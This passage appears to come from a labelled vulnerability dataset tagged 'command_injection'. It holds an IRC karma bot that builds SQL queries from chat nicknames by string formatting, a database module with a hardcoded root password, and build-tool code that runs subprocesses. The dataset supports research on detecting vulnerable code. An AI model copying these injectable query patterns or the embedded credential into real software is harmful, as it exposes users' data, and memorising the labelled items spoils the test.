get_karmas_count(self):\n\t\tself.cursor.execute('SELECT nome,total FROM karma order by total desc')\n\t\tkarmas = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(karmas) == 0:\n\t\t\t\tkarmas = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\tkarmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn karmas\n\tdef get_karmas(self):\n\t\tself.cursor.execute('SELECT nome FROM karma order by total desc')\n\t\tkarmas = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(karmas) == 0:\n\t\t\t\tkarmas = (linha[0])\n\t\t\telse:\t\n\t\t\t\tkarmas = karmas + ', ' + (linha[0])\n\t\treturn karmas\n\tdef get_karma(self, nome):\n\t\tself.cursor.execute(\"SELECT total FROM karma where nome = '%s'\" % (nome))\n\t\tfor linha in self.cursor:\n\t\t\t\treturn (linha[0])\n\tdef get_urls_count(self):\n\t\tself.cursor.execute('SELECT nome,total FROM url order by total desc')\n\t\turls = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(urls) == 0:\n\t\t\t\turls = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\turls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn urls\n\tdef get_slacker_count(self):\n\t\tself.cursor.execute(\"SELECT nome,total FROM slack where data = '%s' order by total desc\" % (time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\tslackers = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(slackers) == 0:\n\t\t\t\tslackers = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\tslackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn slackers\n\n\nclass html:\n\tdef __init__(self, url):\n\t\tself.url = url\n\t\tself.feed = None\n\t\tself.headers = {\n\t      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',\n   \t   'Accept-Language' : 'pt-br,en-us,en',\n      \t'Accept-Charset' : 'utf-8,ISO-8859-1'\n\t   }\n\tdef title(self):\n\t\tself.feed = self.get_data()\n\t\ttitle_pattern = re.compile(r\"<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>\", re.UNICODE)\n\t\ttitle_search = title_pattern.search(self.feed)\n\t\tif title_search is not None:\n\t\t\ttry:\n\t\t\t\treturn \"[ \"+re.sub(\"&#?\\w+;\", \"\", title_search.group(1) )+\" ]\"\n\t\t\texcept:\n\t\t\t\tprint \"Unexpected error:\", sys.exc_info()[0]\n\t\t\t\treturn \"[ Fail in parse ]\"\n\tdef get_data(self):\n\t\ttry:\n\t\t\treqObj = urllib2.Request(self.url, None, self.headers)\n\t\t\turlObj = urllib2.urlopen(reqObj)\n\t\t\treturn  urlObj.read(4096).strip().replace(\"\\n\",\"\").replace(\"\\r\", \"\")\n\t\texcept:\n\t\t\tprint \"Unexpected error:\", sys.exc_info()\n\t\t\treturn \"<title>Fail in get</title>\"\n\n\nbanco = db('carcereiro.db')\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((server, 6667))\nsock.send('NICK %s \\r\\n' % nick)\nsock.send('USER %s \\'\\' \\'\\' :%s\\r\\n' % (nick, 'python'))\nsock.send('JOIN %s \\r\\n' % channel)\n\n\n\nwhile True:\n\tbuffer = sock.recv(2040)\n\tif not buffer:\n\t\tbreak\n\tprint buffer\n\n\tif buffer.find('PING') != -1: \n\t\tsock.send('PONG ' + buffer.split() [1] + '\\r\\n')\n\n\tif re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:\n\t\tsendmsg('@karmas, @urls, @slackers\\r\\n')\n\n\tregexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\\-\\.]+)\\+\\+', re.UNICODE)\n\tregexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\\-\\.]+)\\-\\-', re.UNICODE)\n\tregexk  = re.compile('PRIVMSG.*:karma ([a-z_\\-\\.]+)', re.UNICODE)\n\tregexu  = re.compile('PRIVMSG.*[: ]\\@urls', re.UNICODE)\n\tregexs  = re.compile('PRIVMSG.*[: ]\\@slackers', re.UNICODE)\n\tregexks = re.compile('PRIVMSG.*[: ]\\@karmas', re.UNICODE)\n\tregexslack  = re.compile(':([a-zA-Z0-9\\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)\n\tpattern_url   = re.compile(':([a-zA-Z0-9\\_]+)!.* PRIVMSG .*(http://[\u00e1\u00e9\u00ed\u00f3\u00fa\u00c1\u00c9\u00cd\u00d3\u00da\u00c0\u00e0a-zA-Z0-9_?=./,\\-\\+\\'~]+)', re.UNICODE)\n\t\n\tresultp  = regexp.search(buffer)\n\tresultm  = regexm.search(buffer)\n\tresultk  = regexk.search(buffer)\n\tresultu  = regexu.search(buffer)\n\tresults  = regexs.search(buffer)\n\tresultks = regexks.search(buffer)\n\tresultslack = regexslack.search(buffer)\n\turl_search = pattern_url.search(buffer)\n\n\tif resultslack is not None:\n\t\tvar = len(resultslack.group(2)) - 1\n\t\tnick = resultslack.group(1)\n\t\tbanco.increment_slack(nick,var)\n\n\tif resultp is not None:\n\t\tvar = resultp.group(1)\n\t\tbanco.increment_karma(var)\n\t\tsendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')\n\t\tcontinue\n\n\tif resultm is not None:\n\t\tvar = resultm.group(1)\n\t\tbanco.decrement_karma(var)\n\t\tsendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')\n\t\tcontinue\n\n\tif resultk is not None:\n\t\tvar = resultk.group(1)\n\t\tpoints = banco.get_karma(var)\n\t\tif points is not None:\n\t\t\tsendmsg(var + ' have ' + str(points) + ' points of karma')\n\t\telse:\n\t\t\tsendmsg(var + ' doesn\\'t have any point of karma')\n\t\tcontinue\n\n\tif resultks is not None:\n\t\tsendmsg('karmas : ' + banco.get_karmas_count())\n\t\tcontinue\n\t\n\tif results is not None:\n\t\tsendmsg('slackers in chars : ' + banco.get_slacker_count())\n\t\tcontinue\n\n\tif resultu is not None:\n\t\tsendmsg('users : ' + banco.get_urls_count())\n\t\tcontinue\n\t\n\tif url_search is not None:\n\t\ttry:\n\t\t\turl  = url_search.group(2)\n\t\t\tnick = url_search.group(1)\n\t\t\tparser = html(url)\n\t\t\tsendmsg(  parser.title() )\n\t\t\tbanco.increment_url( nick )\n\t\texcept:\n\t\t\tsendmsg('[ Failed ]')\n\t\t\tprint url\n\t\t\tprint \"Unexpected error:\", sys.exc_info()[0]\n\nsock.close()\nbanco.close()\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "b551cd0cd87c3df45fc7787828f3bdd6422a7c72", "code": "/bot_sql.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport re\nimport socket\nimport sys\nimport urllib2\nimport os\nimport time\nfrom pysqlite2 import dbapi2 as sqlite\n\nchannel = '#masmorra'\nnick = 'carcereiro'\nserver = 'irc.oftc.net' \n\ndef sendmsg(msg): \n    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\\r\\n')\n\nclass db():\n\tdef __init__(self, dbfile):\n\t\tif not os.path.exists(dbfile):\n\t\t\tself.conn = sqlite.connect(dbfile)\n\t\t\tself.cursor = self.conn.cursor()\n\t\t\tself.create_table()\n\t\tself.conn = sqlite.connect(dbfile)\n\t\tself.cursor = self.conn.cursor()\n\tdef close(self):\n\t\tself.cursor.close()\n\t\tself.conn.close()\n\tdef create_table(self):\n\t\tself.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')\n\t\tself.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')\n\t\tself.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')\n\t\tself.conn.commit()\n\tdef insert_karma(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO karma(nome,total) VALUES ('%s', %d );\" % (nome,total))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\t#print \"Unexpected error:\", sys.exc_info()[0]\n\t\t\treturn False\n\tdef increment_karma(self,nome):\n\t\tif not self.insert_karma(nome,1):\n\t\t\tself.cursor.execute(\"UPDATE karma SET total = total + 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef decrement_karma(self,nome):\n\t\tif not self.insert_karma(nome,-1):\n\t\t\tself.cursor.execute(\"UPDATE karma SET total = total - 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef insert_url(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO url(nome,total) VALUES ('%s', %d );\" % (nome,total))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\treturn False\n\tdef increment_url(self,nome):\n\t\tif not self.insert_url(nome,1):\n\t\t\tself.cursor.execute(\"UPDATE url SET total = total + 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef insert_slack(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );\" % (nome,total,time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\treturn False\n\tdef increment_slack(self,nome,total):\n\t\tif not self.insert_slack(nome,total):\n\t\t\tself.cursor.execute(\"UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;\" % (total,nome,time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\t\tself.conn.commit()\n\tdef get_karmas_count(self):\n\t\tself.cursor.execute('SELECT nome,total FROM karma order by total desc')\n\t\tkarmas = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(karmas) == 0:\n\t\t\t\tkarmas = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\tkarmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn karmas\n\tdef get_karmas(self):\n\t\tself.cursor.execute('SELECT nome FROM karma order by total desc')\n\t\tkarmas = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(karmas) == 0:\n\t\t\t\tkarmas = (linha[0])\n\t\t\telse:\t\n\t\t\t\tkarmas = karmas + ', ' + (linha[0])\n\t\treturn karmas\n\tdef get_karma(self, nome):\n\t\tself.cursor.execute(\"SELECT total FROM karma where nome = '%s'\" % (nome))\n\t\tfor linha in self.cursor:\n\t\t\t\treturn (linha[0])\n\tdef get_urls_count(self):\n\t\tself.cursor.execute('SELECT nome,total FROM url order by total desc')\n\t\turls = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(urls) == 0:\n\t\t\t\turls = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\turls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn urls\n\tdef get_slacker_count(self):\n\t\tself.cursor.execute(\"SELECT nome,total FROM slack where data = '%s' order by total desc\" % (time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\tslackers = ''\n\t\tfor linha in self.cursor:\n\t\t\tif len(slackers) == 0:\n\t\t\t\tslackers = (linha[0]) + ' = ' + str(linha[1])\n\t\t\telse:\n\t\t\t\tslackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])\n\t\treturn slackers\n\n\nclass html:\n\tdef __init__(self, url):\n\t\tself.url = url\n\t\tself.feed = None\n\t\tself.headers = {\n\t      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',\n   \t   'Accept-Language' : 'pt-br,en-us,en',\n      \t'Accept-Charset' : 'utf-8,ISO-8859-1'\n\t   }\n\tdef title(self):\n\t\tself.feed = self.get_data()\n\t\ttitle_pattern = re.compile(r\"<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>\", re.UNICODE)\n\t\ttitle_search = title_pattern.search(self.feed)\n\t\tif title_search is not None:\n\t\t\ttry:\n\t\t\t\treturn \"[ \"+re.sub(\"&#?\\w+;\", \"\", title_search.group(1) )+\" ]\"\n\t\t\texcept:\n\t\t\t\tprint \"Unexpected error:\", sys.exc_info()[0]\n\t\t\t\treturn \"[ Fail in parse ]\"\n\tdef get_data(self):\n\t\ttry:\n\t\t\treqObj = urllib2.Request(self.url, None, self.headers)\n\t\t\turlObj = urllib2.urlopen(reqObj)\n\t\t\treturn  urlObj.read(4096).strip().replace(\"\\n\",\"\")\n\t\texcept:\n\t\t\tprint \"Unexpected error:\", sys.exc_info()\n\t\t\treturn \"<title>Fail in get</title>\"\n\n\nbanco = db('carcereiro.db')\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((server, 6667))\nsock.send('NICK %s \\r\\n' % nick)\nsock.send('USER %s \\'\\' \\'\\' :%s\\r\\n' % (nick, 'python'))\nsock.send('JOIN %s \\r\\n' % channel)\n\n\n\nwhile True:\n\tbuffer = sock.recv(2040)\n\tif not buffer:\n\t\tbreak\n\tprint buffer\n\n\tif buffer.find('PING') != -1: \n\t\tsock.send('PONG ' + buffer.split() [1] + '\\r\\n')\n\n\tif re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:\n\t\tsendmsg('@karmas, @urls, @slackers\\r\\n')\n\n\tregexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\\-\\.]+)\\+\\+', re.UNICODE)\n\tregexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\\-\\.]+)\\-\\-', re.UNICODE)\n\tregexk  = re.compile('PRIVMSG.*:karma ([a-z_\\-\\.]+)', re.UNICODE)\n\tregexu  = re.compile('PRIVMSG.*[: ]\\@urls', re.UNICODE)\n\tregexs  = re.compile('PRIVMSG.*[: ]\\@slackers', re.UNICODE)\n\tregexks = re.compile('PRIVMSG.*[: ]\\@karmas', re.UNICODE)\n\tregexslack  = re.compile(':([a-zA-Z0-9\\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)\n\tpattern_url   = re.compile(':([a-zA-Z0-9\\_]+)!.* PRIVMSG .*(http://[\u00e1\u00e9\u00ed\u00f3\u00fa\u00c1\u00c9\u00cd\u00d3\u00da\u00c0\u00e0a-zA-Z0-9_?=./,\\-\\+\\'~]+)', re.UNICODE)\n\t\n\tresultp  = regexp.search(buffer)\n\tresultm  = regexm.search(buffer)\n\tresultk  = regexk.search(buffer)\n\tresultu  = regexu.search(buffer)\n\tresults  = regexs.search(buffer)\n\tresultks = regexks.search(buffer)\n\tresultslack = regexslack.search(buffer)\n\turl_search = pattern_url.search(buffer)\n\n\tif resultslack is not None:\n\t\tvar = len(resultslack.group(2)) - 1\n\t\tnick = resultslack.group(1)\n\t\tbanco.increment_slack(nick,var)\n\n\tif resultp is not None:\n\t\tvar = resultp.group(1)\n\t\tbanco.increment_karma(var)\n\t\tsendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')\n\t\tcontinue\n\n\tif resultm is not None:\n\t\tvar = resultm.group(1)\n\t\tbanco.decrement_karma(var)\n\t\tsendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')\n\t\tcontinue\n\n\tif resultk is not None:\n\t\tvar = resultk.group(1)\n\t\tpoints = banco.get_karma(var)\n\t\tif points is not None:\n\t\t\tsendmsg(var + ' have ' + str(points) + ' points of karma')\n\t\telse:\n\t\t\tsendmsg(var + ' doesn\\'t have any point of karma')\n\t\tcontinue\n\n\tif resultks is not None:\n\t\tsendmsg('karmas : ' + banco.get_karmas_count())\n\t\tcontinue\n\t\n\tif results is not None:\n\t\tsendmsg('slackers in chars : ' + banco.get_slacker_count())\n\t\tcontinue\n\n\tif resultu is not None:\n\t\tsendmsg('users : ' + banco.get_urls_count())\n\t\tcontinue\n\t\n\tif url_search is not None:\n\t\ttry:\n\t\t\turl  = url_search.group(2)\n\t\t\tnick = url_search.group(1)\n\t\t\tparser = html(url)\n\t\t\tsendmsg(  parser.title() )\n\t\t\tbanco.increment_url( nick )\n\t\texcept:\n\t\t\tsendmsg('[ Failed ]')\n\t\t\tprint url\n\t\t\tprint \"Unexpected error:\", sys.exc_info()[0]\n\nsock.close()\nbanco.close()\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "8076b9475ed007a4d0e5d10c9b6938f72f5d35a5", "code": "Server/model.py/n/nfrom mysql_commands import *\n\ndef select_all_apps():\n\treturn select_row_from_mysql_command(\"SELECT * FROM apps\")\n\ndef select_all_apps_from_user(user_id):\n\treturn select_row_from_mysql_command(\"SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?\", user_id)\n\ndef select_all_devices_from_user(user_id):\n\treturn select_row_from_mysql_command(\"SELECT * FROM devices WHERE user_id=?\", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy\nfrom sqlalchemy import text\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')\nSession = scoped_session(sessionmaker(bind=engine))\n\ns = Session()\n\ndef select_row_from_mysql_command(command_str):\n    ''' function for selecting a specific row  '''\n    ''' OUPUT: a list of elements in the selected row '''\n\n    sql = text(str(command_str))\n    return s.execute(sql).fetchall()\n\n\ndef insert_into_mysql_command(command_str):\n        ''' the function inserts data depending from a command_str '''\n\n        sql = text(str(command_str))\n        s.execute(sql)\n        s.commit()\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "8076b9475ed007a4d0e5d10c9b6938f72f5d35a5", "code": "/Server/model.py/n/nimport sqlalchemy\nfrom sqlalchemy import text\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')\nSession = scoped_session(sessionmaker(bind=engine))\n\ndef select_all_apps():\n\treturn s.execute(\"SELECT * FROM apps\").fetchall()\n\ndef select_all_apps_from_user(user_id):\n\treturn s.execute(\"SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?\", user_id)\n\ndef select_all_devices_from_user(user_id):\n\treturn s.execute(\"SELECT * FROM devices WHERE user_id=?\", user_id)/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "b3683453b29eba54aca6d04cd8a717429257c0fc", "code": "contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8\n# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import (absolute_import, division, generators, nested_scopes, print_function,\n                        unicode_literals, with_statement)\n\nimport logging\nimport os\nimport subprocess\nfrom collections import namedtuple\n\nfrom pants.base.exceptions import TaskError\nfrom pants.binaries.binary_util import BinaryUtil\nfrom pants.fs.archive import TGZ\nfrom pants.subsystem.subsystem import Subsystem\nfrom pants.util.memo import memoized_method\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass NodeDistribution(object):\n  \"\"\"Represents a self-bootstrapping Node distribution.\"\"\"\n\n  class Factory(Subsystem):\n    options_scope = 'node-distribution'\n\n    @classmethod\n    def subsystem_dependencies(cls):\n      return (BinaryUtil.Factory,)\n\n    @classmethod\n    def register_options(cls, register):\n      super(NodeDistribution.Factory, cls).register_options(register)\n      register('--supportdir', advanced=True, default='bin/node',\n               help='Find the Node distributions under this dir.  Used as part of the path to '\n                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')\n      register('--version', advanced=True, default='6.9.1',\n               help='Node distribution version.  Used as part of the path to lookup the '\n                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')\n      register('--package-manager', advanced=True, default='npm', fingerprint=True,\n               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),\n               help='Default package manager config for repo. Should be one of {}'.format(\n                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))\n      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,\n               help='Yarnpkg version. Used for binary utils')\n\n    def create(self):\n      # NB: create is an instance method to allow the user to choose global or scoped.\n      # It's not unreasonable to imagine multiple Node versions in play; for example: when\n      # transitioning from the 0.10.x series to the 0.12.x series.\n      binary_util = BinaryUtil.Factory.create()\n      options = self.get_options()\n      return NodeDistribution(\n        binary_util, options.supportdir, options.version,\n        package_manager=options.package_manager,\n        yarnpkg_version=options.yarnpkg_version)\n\n  PACKAGE_MANAGER_NPM = 'npm'\n  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'\n  VALID_PACKAGE_MANAGER_LIST = {\n    'npm': PACKAGE_MANAGER_NPM,\n    'yarn': PACKAGE_MANAGER_YARNPKG\n  }\n\n  @classmethod\n  def validate_package_manager(cls, package_manager):\n    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():\n      raise TaskError('Unknown package manager: %s' % package_manager)\n    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]\n    return package_manager\n\n  @classmethod\n  def _normalize_version(cls, version):\n    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not\n    # 'X.Y.Z'.\n    return version if version.startswith('v') else 'v' + version\n\n  def __init__(self, binary_util, supportdir, version, package_manager, yarnpkg_version):\n    self._binary_util = binary_util\n    self._supportdir = supportdir\n    self._version = self._normalize_version(version)\n    self.package_manager = self.validate_package_manager(package_manager=package_manager)\n    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)\n    logger.debug('Node.js version: %s package manager from config: %s',\n                 self._version, package_manager)\n\n  @property\n  def version(self):\n    \"\"\"Returns the version of the Node distribution.\n\n    :returns: The Node distribution version number string.\n    :rtype: string\n    \"\"\"\n    return self._version\n\n  def unpack_package(self, supportdir, version, filename):\n    tarball_filepath = self._binary_util.select_binary(\n      supportdir=supportdir, version=version, name=filename)\n    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)\n    work_dir = os.path.dirname(tarball_filepath)\n    TGZ.extract(tarball_filepath, work_dir)\n    return work_dir\n\n  @memoized_method\n  def install_node(self):\n    \"\"\"Install the Node distribution from pants support binaries.\n\n    :returns: The Node distribution bin path.\n    :rtype: string\n    \"\"\"\n    node_package_path = self.unpack_package(\n      supportdir=self._supportdir, version=self.version, filename='node.tar.gz')\n    # Todo: https://github.com/pantsbuild/pants/issues/4431\n    # This line depends on repacked node distribution.\n    # Should change it from 'node/bin' to 'dist/bin'\n    node_bin_path = os.path.join(node_package_path, 'node', 'bin')\n    return node_bin_path\n\n  @memoized_method\n  def install_yarnpkg(self):\n    \"\"\"Install the Yarnpkg distribution from pants support binaries.\n\n    :returns: The Yarnpkg distribution bin path.\n    :rtype: string\n    \"\"\"\n    yarnpkg_package_path = self.unpack_package(\n      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz')\n    yarnpkg_bin_path = os.path.join(yarnpkg_package_path, 'dist', 'bin')\n    return yarnpkg_bin_path\n\n  class Command(namedtuple('Command', ['executable', 'args', 'extra_paths'])):\n    \"\"\"Describes a command to be run using a Node distribution.\"\"\"\n\n    @property\n    def cmd(self):\n      \"\"\"The command line that will be executed when this command is spawned.\n\n      :returns: The full command line used to spawn this command as a list of strings.\n      :rtype: list\n      \"\"\"\n      return [self.executable] + (self.args or [])\n\n    def _prepare_env(self, kwargs):\n      \"\"\"Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.\n\n      If there is no 'env' field in the kwargs, os.environ.copy() is used.\n      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.\n\n      :param kwargs: The original kwargs.\n      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.\n      :rtype: (dict, dict)\n      \"\"\"\n      kwargs = kwargs.copy()\n      env = kwargs.pop('env', os.environ).copy()\n      env['PATH'] = os.path.pathsep.join(self.extra_paths + [env.get('PATH', '')])\n      return env, kwargs\n\n    def run(self, **kwargs):\n      \"\"\"Runs this command.\n\n      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.\n      :returns: A handle to the running command.\n      :rtype: :class:`subprocess.Popen`\n      \"\"\"\n      env, kwargs = self._prepare_env(kwargs)\n      return subprocess.Popen(self.cmd, env=env, **kwargs)\n\n    def check_output(self, **kwargs):\n      \"\"\"Runs this command returning its captured stdout.\n\n      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.\n      :returns: The captured standard output stream of the command.\n      :rtype: string\n      :raises: :class:`subprocess.CalledProcessError` if the command fails.\n      \"\"\"\n      env, kwargs = self._prepare_env(kwargs)\n      return subprocess.check_output(self.cmd, env=env, **kwargs)\n\n    def __str__(self):\n      return ' '.join(self.cmd)\n\n  def node_command(self, args=None):\n    \"\"\"Creates a command that can run `node`, passing the given args to it.\n\n    :param list args: An optional list of arguments to pass to `node`.\n    :returns: A `node` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running\n    # `node` with no arguments is useful, it launches a REPL.\n    node_bin_path = self.install_node()\n    return self.Command(\n      executable=os.path.join(node_bin_path, 'node'), args=args,\n      extra_paths=[node_bin_path])\n\n  def npm_command(self, args):\n    \"\"\"Creates a command that can run `npm`, passing the given args to it.\n\n    :param list args: A list of arguments to pass to `npm`.\n    :returns: An `npm` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    node_bin_path = self.install_node()\n    return self.Command(\n      executable=os.path.join(node_bin_path, 'npm'), args=args,\n      extra_paths=[node_bin_path])\n\n  def yarnpkg_command(self, args):\n    \"\"\"Creates a command that can run `yarnpkg`, passing the given args to it.\n\n    :param list args: A list of arguments to pass to `yarnpkg`.\n    :returns: An `yarnpkg` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    node_bin_path = self.install_node()\n    yarnpkg_bin_path = self.install_yarnpkg()\n    return self.Command(\n      executable=os.path.join(yarnpkg_bin_path, 'yarnpkg'), args=args,\n      extra_paths=[yarnpkg_bin_path, node_bin_path])\n/n/n/ncontrib/node/tests/python/pants_test/contrib/node/subsystems/test_node_distribution.py/n/n# coding=utf-8\n# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import (absolute_import, division, generators, nested_scopes, print_function,\n                        unicode_literals, with_statement)\n\nimport json\nimport os\nimport subprocess\nimport unittest\n\nfrom pants_test.subsystem.subsystem_util import global_subsystem_instance\n\nfrom pants.contrib.node.subsystems.node_distribution import NodeDistribution\n\n\nclass NodeDistributionTest(unittest.TestCase):\n\n  def setUp(self):\n    self.distribution = global_subsystem_instance(NodeDistribution.Factory).create()\n\n  def test_bootstrap(self):\n    node_cmd = self.distribution.node_command(args=['--version'])\n    output = node_cmd.check_output()\n    self.assertEqual(self.distribution.version, output.strip())\n\n  def test_node(self):\n    node_command = self.distribution.node_command(args=['--interactive'])  # Force a REPL session.\n    repl = node_command.run(stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    out, err = repl.communicate('console.log(\"Hello World!\")')\n    self.assertEqual('', err)\n    self.assertEqual(0, repl.returncode)\n\n    for line in out.splitlines():\n      if line.endswith('Hello World!'):\n        break\n    else:\n      self.fail('Did not find the expected \"Hello World!\" in the REPL session '\n                'output:\\n{}'.format(out))\n\n  def test_npm(self):\n    npm_version_flag = self.distribution.npm_command(args=['--version'])\n    raw_version = npm_version_flag.check_output().strip()\n\n    npm_version_cmd = self.distribution.npm_command(args=['version', '--json'])\n    versions_json = npm_version_cmd.check_output()\n    versions = json.loads(versions_json)\n\n    self.assertEqual(raw_version, versions['npm'])\n\n  def test_yarnpkg(self):\n    yarnpkg_version_command = self.distribution.yarnpkg_command(args=['--version'])\n    yarnpkg_version = yarnpkg_version_command.check_output().strip()\n    yarnpkg_versions_command = self.distribution.yarnpkg_command(args=['versions', '--json'])\n    yarnpkg_versions = json.loads(yarnpkg_versions_command.check_output())\n    self.assertEqual(yarnpkg_version, yarnpkg_versions['data']['yarn'])\n\n  def test_node_command_path_injection(self):\n    node_bin_path = self.distribution.install_node()\n    node_path_cmd = self.distribution.node_command(\n      args=['--eval', 'console.log(process.env[\"PATH\"])'])\n\n    # Test the case in which we do not pass in env,\n    # which should fall back to env=os.environ.copy()\n    injected_paths = node_path_cmd.check_output().strip().split(os.pathsep)\n    self.assertEqual(node_bin_path, injected_paths[0])\n\n  def test_node_command_path_injection_with_overrided_path(self):\n    node_bin_path = self.distribution.install_node()\n    node_path_cmd = self.distribution.node_command(\n      args=['--eval', 'console.log(process.env[\"PATH\"])'])\n    injected_paths = node_path_cmd.check_output(\n      env={'PATH': '/test/path'}\n    ).strip().split(os.pathsep)\n    self.assertEqual(node_bin_path, injected_paths[0])\n    self.assertListEqual([node_bin_path, '/test/path'], injected_paths)\n\n  def test_node_command_path_injection_with_empty_path(self):\n    node_bin_path = self.distribution.install_node()\n    node_path_cmd = self.distribution.node_command(\n      args=['--eval', 'console.log(process.env[\"PATH\"])'])\n    injected_paths = node_path_cmd.check_output(\n      env={'PATH': ''}\n    ).strip().split(os.pathsep)\n    self.assertListEqual([node_bin_path, ''], injected_paths)\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "b3683453b29eba54aca6d04cd8a717429257c0fc", "code": "/contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8\n# Copyright 2015 Pants project contributors (see 